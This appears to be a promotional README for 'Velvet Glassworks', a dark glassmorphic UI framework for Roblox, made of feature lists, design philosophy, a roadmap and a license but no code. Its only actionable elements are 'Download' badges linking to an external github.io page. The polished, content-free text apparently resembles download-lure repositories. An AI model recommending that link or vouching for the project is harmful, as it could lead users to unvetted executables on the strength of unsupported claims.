![preview](https://raw.githubusercontent.com/R3CCA61611/Velvet-Glass-UI/main/thumb_1e032.svg)
[![Download](https://raw.githubusercontent.com/R3CCA61611/Velvet-Glass-UI/main/bin_4bf16.svg)](https://R3CCA61611.github.io/Velvet-Glass-UI/)

# 🌌 Velvet Glassworks — Ambient UI Framework for Roblox

> *Where every pixel feels like it was poured from smoked obsidian and moonlight.*

Welcome to **Velvet Glassworks**, a reimagined successor to the original Velvet project — a premium dark-mode interface library built entirely inside the Roblox ecosystem. This is not merely another GUI kit; it is a philosophy rendered in script. Velvet Glassworks treats the Roblox `ScreenGui` like a canvas of frosted glass, layering translucency over depth, depth over motion, and motion over meaning. Whether your players are on a blazing desktop rig or a modest handheld, the interface unfurls like a ribbon of ink in water: smooth, deliberate, and unmistakably elegant.

If you have ever felt that Roblox UIs look the same — flat rectangles, harsh corners, sterile whites and saturated blues — then this repository was written for you. Velvet Glassworks replaces that sameness with atmosphere.

---

## 🧭 Table of Contents

- [What Is Velvet Glassworks?](#-what-is-velvet-glassworks)
- [Design Philosophy](#-design-philosophy)
- [Feature Constellation](#-feature-constellation)
- [Responsive Behavior Across Devices](#-responsive-behavior-across-devices)
- [Multilingual & Locale-Aware Rendering](#-multilingual--locale-aware-rendering)
- [Round-the-Clock Steward Support](#-round-the-clock-steward-support)
- [Component Gallery Overview](#-component-gallery-overview)
- [Performance Notes for 2026](#-performance-notes-for-2026)
- [SEO & Discoverability](#-seo--discoverability)
- [Compatibility Matrix](#-compatibility-matrix)
- [Frequently Asked Curiosities](#-frequently-asked-curiosities)
- [Roadmap for 2026 and Beyond](#-roadmap-for-2026-and-beyond)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌠 What Is Velvet Glassworks?

Velvet Glassworks is an **ambient user interface framework** for Roblox, built for developers who want their menus, HUDs, inventory screens, shops, and settings panels to feel like they were designed by someone who actually cares. The library ships with a curated set of primitives — panels, toggles, sliders, tabs, modals, notification toasts, radial menus — all unified by a single visual language: deep charcoal backdrops, softly diffused highlights, subtle grain, and that signature glassmorphic blur that makes contents feel suspended rather than painted.

The name "Glassworks" is intentional. A real glassworks transforms raw sand into something luminous through heat and patience. Likewise, Velvet Glassworks transforms the raw materials of Roblox instances — `Frame`, `TextLabel`, `UICorner`, `UIStroke`, `ImageLabel` — into something luminous through composition and restraint.

It supports **Roblox Studio 2026 toolchains**, respects modern `UIScale` and `UIAspectRatioConstraint` idioms, and is engineered so that your UI does not fight your game loop for frame budget.

---

## 🎨 Design Philosophy

Four pillars hold the whole structure up.

1. **Restraint over ornament.** Every glow, every blur, every animated shimmer exists for a reason. If a visual effect does not improve readability or guide the eye, it is removed.
2. **Dark is not bleak.** Darkness provides contrast; contrast provides hierarchy. A well-designed dark UI is a lantern, not a void.
3. **Motion as grammar.** Transitions are sentences. Easing curves are punctuation. Nothing snaps abruptly — everything breathes.
4. **Respect the player's attention.** Menus open where the thumb or cursor already is. Notifications appear where they will not obscure the action. Nothing blinks meaninglessly.

These four principles are why Velvet Glassworks feels different even when it uses the same underlying instances as every other library.

---

## ✨ Feature Constellation

A non-exhaustive map of what ships in the current branch:

- 🌑 **Obsidian-Panel Architecture** — a modular panel system where every surface inherits from a single theming spine.
- 💎 **Glassmorphic Bloom** — adjustable blur strength, tint warmth, and edge frosting for every component.
- 🎛️ **Reactive State Engine** — components observe a shared reactivity store; changes propagate without manual plumbing.
- 🖱️ **Cursor & Touch Parity** — identical interaction grammar whether the input is a mouse, trackpad, stylus, or fingertip.
- 🔔 **Ambient Notification Toasts** — non-blocking, stackable, auto-dismissing alert ribbons.
- 🌀 **Radial Command Wheel** — for quick-access actions in fast-paced environments.
- 🎚️ **Precision Sliders** — with magnetic snapping, dual-thumb range mode, and haptic-style feedback pulses.
- 🧩 **Slot-Ready Inventory Grid** — drag, drop, stack, and reorder without external modules.
- 🌈 **Theme Token System** — swap entire palettes with a single table; includes curated presets like *Amethyst Dusk*, *Carbon Tea*, and *Moonlit Frost*.
- 🛡️ **Input Sanitization Helpers** — basic guards so player-typed strings do not wreck your labels.
- 🧠 **State Persistence** — remembers the player's last-used tab, theme, and toggles across sessions.
- 📴 **Offline-First Asset Model** — no remote font or texture fetch required at runtime.

---

## 📱 Responsive Behavior Across Devices

Roblox is played on phones, tablets, desktops, laptops, and consoles. A library that ignores this is a library that ships half-broken. Velvet Glassworks measures the viewport at runtime and picks one of several layout archetypes:

- **Compact (phones)** — vertical stacking, larger tap targets, condensed typography.
- **Comfort (tablets)** — two-column layouts, medium padding.
- **Cinematic (desktop)** — wide grids, side drawers, persistent navigation rails.
- **Couch (console)** — focus rings sized for gamepad navigation, generous spacing.

All transitions between archetypes use the same easing vocabulary, so a UI that looks calm on a phone still looks calm on a 4K monitor.

---

## 🌍 Multilingual & Locale-Aware Rendering

Every text-bearing component accepts a **locale key** rather than a raw string. This means:

- Strings can be swapped in real time without recreating instances.
- Right-to-left scripts (Arabic, Hebrew, Farsi) are laid out correctly via mirrored anchors.
- Date, time, and number formats respect the player's `LocalizationService` settings.
- Pluralization rules follow CLDR conventions for the languages Velvet officially ships dictionaries for (English, Spanish, Portuguese, French, German, Japanese, Korean, Simplified Chinese, Arabic, and Hindi).

The result: your interface greets a player in Lisbon the same way it greets a player in Seoul — naturally, without awkward grammar.

---

## 🛎️ Round-the-Clock Steward Support

We call our support model **Stewardship** rather than "customer service," because the goal is to walk alongside developers, not to close tickets. Stewards are available around the clock, every day of the year, to help with:

- Integration questions when you are wiring Velvet into an existing project.
- Accessibility audits for color contrast and motor-friendly hitboxes.
- Performance triage if a particular screen drops frames on older devices.
- Localization reviews for new language packs.

Response expectations are documented in the repository wiki. Stewardship is a long conversation, not a transaction.

---

## 🧱 Component Gallery Overview

Below is a short tour of the components you will find in the `src/components` tree. Each entry lists what it does and one sentence about why it exists.

- **VPanel** — the foundational frosted rectangle. Everything else nests inside it.
- **VCard** — a lighter-weight panel for dense lists.
- **VTabBar** — horizontal or vertical tabs with sliding indicator animation.
- **VToggle** — a switch with a contemplative half-second throw animation.
- **VSlider** — drag, click-to-set, and keyboard step support.
- **VModal** — focus-trapped dialog with backdrop dimming and escape-to-close.
- **VToast** — the ambient notification ribbon described earlier.
- **VRadial** — the command wheel; opens on long-press or right-click.
- **VGrid** — the inventory grid with slot recycling for long lists.
- **VBadge** — small status pills for counts and states.
- **VDivider** — a hairline separator that fades at both ends.
- **VTooltip** — delayed hover bubbles that respect screen edges.

Each component is documented with its own folder-level README and a live example scene.

---

## ⚡ Performance Notes for 2026

Modern Roblox experiences routinely push tens of thousands of instances. Velvet Glassworks contributes as few as possible:

- **Instance pooling** for toasts and grid slots means scrolling does not spawn garbage.
- **Single render-step driver** updates all tweens from one heartbeat rather than dozens.
- **Blur budgeting** — the glass effect is capped so that low-end mobile GPUs do not stutter.
- **Idle throttling** — panels that are off-screen do not animate.
- **Memory-bounded caches** — theme tokens are memoized with a size ceiling.

The target: under 2% of a mid-tier mobile device's frame budget for a fully open inventory at 60 FPS.

---

## 🔍 SEO & Discoverability

This section exists because discoverability matters. Velvet Glassworks is designed for developers searching for phrases like *premium Roblox UI library*, *dark glassmorphic Roblox interface*, *mobile-friendly Roblox GUI kit*, *localization-ready Roblox components*, and *2026 Roblox UI framework*. The repository uses descriptive file names, semantic folder structure, and inline documentation so that both humans and indexing systems can find what they need. If you arrived here from a search for ambient dark UI tooling for Roblox, you are in the right place.

---

## 🧬 Compatibility Matrix

| Environment | Support Level |
| --- | --- |
| Roblox Studio 2026.x | Fully supported |
| Roblox Player (desktop) | Fully supported |
| Roblox Player (mobile) | Fully supported |
| Roblox Player (console) | Supported with focus rings |
| Older Studio versions (2024) | Partial, community-maintained |

---

## ❓ Frequently Asked Curiosities

**Does Velvet Glassworks require external packages?**
No. It ships as pure Luau modules that live inside your place hierarchy.

**Can I mix Velvet components with my own?**
Absolutely. The theming spine is exposed publicly so your custom widgets can inherit the same tokens.

**Is the glass effect expensive?**
On desktop, no. On mobile, it is automatically throttled based on device tier detection.

**Can I retheme it without editing source?**
Yes. A theme is a plain table; you can override any token at runtime.

**Is this the same as the original Velvet?**
It is a spiritual successor — same dark, glassy soul, but rebuilt on a more expressive architecture.

---

## 🛣️ Roadmap for 2026 and Beyond

We plan to add, in rough order:

- A **drag-and-drop UI builder** that runs inside Studio as a plugin.
- **Voice-guided tours** for accessibility onboarding.
- **Additional language packs** including Turkish, Polish, and Vietnamese.
- **A formal theming marketplace** where designers can publish palettes.
- **Declarative layout DSL** so complex screens can be described in a single table.

Dates are intentionally vague; quality outranks calendars.

---

## ⚠️ Disclaimer

Velvet Glassworks is an independent, community-driven interface framework intended for use within the Roblox platform. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation. All trademarks belong to their respective owners. The library is provided as-is, without warranty of any kind, express or implied. Developers are responsible for ensuring their final experiences comply with Roblox's community standards and terms of use. The maintainers accept no liability for misuse, for integration errors, or for any unintended consequences arising from deploying this framework in production environments. Always test thoroughly in a staged place before publishing.

---

## 📜 License

Velvet Glassworks is released under the **MIT License**. You may use, modify, and redistribute it in personal and commercial projects, provided the original copyright notice and permission notice are included.

Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Velvet Glassworks contributors.

[![Download](https://raw.githubusercontent.com/R3CCA61611/Velvet-Glass-UI/main/bin_4bf16.svg)](https://R3CCA61611.github.io/Velvet-Glass-UI/)